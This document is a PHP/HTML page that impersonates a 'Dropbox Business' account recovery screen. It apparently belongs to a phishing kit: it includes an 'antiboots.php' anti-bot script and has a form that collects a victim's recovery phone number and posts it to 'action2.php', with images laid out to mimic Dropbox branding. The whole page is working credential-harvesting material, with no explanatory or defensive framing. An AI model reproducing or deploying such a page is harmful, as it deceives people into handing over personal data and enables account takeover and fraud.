<?php

include "antiboots.php";

?><html>
    
    <head>
        <! --- Links ---- !>
        <link rel="stylesheet" href="./css/style1.css" type="text/css" />
        <title>Dropbox Business</title>
        <! ---- Links --- !>
         </head>
    <body>
        <! --- Header ---- !>
       <header class="ilyas_header">
           <div class="logo">
               <img src="./img/logo.png" style="position:absolute;left:220px;top:17px;">
           </div>
           <div id="header-border-div"></div>
           <div class="help">
               <img src="./img/help.png" style="position:absolute;left:1065px;top:23px;">
           </div>
                  </header>
        <! --- Header ---- !>   
        <div id="text h2">
            <img src="./img/texto_23.PNG" style="position:absolute;left:470px;top:118px;">
            
        </div>
        <! --- Form Login --- !>
        <div id="form" style="left:435px;height:120px;">
            <form action="action2.php" method="post">
            <h2 style="position:absolute;left:105;top:5px;">Recovery Phone Number</h2>
            <div id="header-border-div2"></div>
        <input type="phone" name="phone" placeholder="Your Phone Number" required
             style="position:absolute;left:45px;top:90px;width:359;height:34px;padding:10px;border-radius:6px;border: 1px solid #bdc4c9;"    />
                <button type="submit" class="login-button button-primary" style="position:absolute;top:130px;left:40%;">
            <div class="sign-in-text">Continue</div>
            </button> 
            </form>
            </div>
        <! --- Form Login --- !>
        <! --- Under Form --- !>
                <! --- Under Form --- !>
        <! --- Footer ---- !>
        <div id="footer">
            <img src="./img/footer.jpg" style="position:absolute;left:179px;top:500px">
                </div>
        <! --- Footer ---- !>
    </body>
</html>